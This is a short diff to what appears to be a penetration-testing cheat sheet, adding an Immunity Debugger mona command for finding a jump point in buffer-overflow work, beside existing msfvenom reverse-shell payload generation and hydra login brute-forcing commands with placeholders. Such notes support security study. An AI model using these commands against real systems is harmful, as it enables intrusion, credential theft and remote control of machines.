@@ -35,3 +35,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP_ADDRESS> LPORT=<
 ```
 hydra -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
 ```
+
+### Immunity Debugger (Finding a jump point)
+
+```
+!mona jmp -r esp -cpb [bad characters]
+```
